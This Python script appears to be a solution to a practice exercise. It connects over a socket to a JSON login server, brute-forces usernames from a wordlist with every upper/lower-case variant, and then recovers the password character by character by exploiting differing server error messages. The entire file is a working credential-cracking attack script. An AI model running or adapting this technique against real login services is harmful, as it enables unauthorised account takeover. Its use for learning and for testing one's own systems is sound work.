from itertools import product
from json import dumps, loads
from socket import socket
from sys import argv


class Socket:
    def __init__(self, host="localhost", port=9090, creds=None):
        self.host = host
        self.port = int(port)
        self.creds = creds

    def crack_login(self, sock):
        with open("C:\\Users\\yagoa\\Downloads\\logins.txt", "r") as file:
            for line in file:
                for i in product(*zip(line.strip(), line.strip().swapcase())):
                    login_attempt = "".join(i)
                    response = self.json_send_receive(sock, login_attempt, " ")
                    if response[0]["result"] == "Wrong password!":
                        return login_attempt

    @staticmethod
    def json_send_receive(sock, login, pwd):
        json_send = dumps({"login": login, "password": pwd}, indent=4)
        sock.send(json_send.encode())
        return loads(sock.recv(1024).decode()), json_send

    def crack_creds(self):
        with socket() as sock:
            sock.connect((self.host, self.port))
            login = self.crack_login(sock)
            chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            pwd = ""
            for _i in range(16):
                for char in chars:
                    response = self.json_send_receive(sock, login, pwd + char)
                    if response[0]["result"] == "Exception happened during login":
                        pwd += char
                        break
                    elif response[0]["result"] == "Connection success!":
                        return response[1]


def main():
    new_socket = Socket(*argv[1:])
    print(new_socket.crack_creds())


if __name__ == "__main__":
    main()
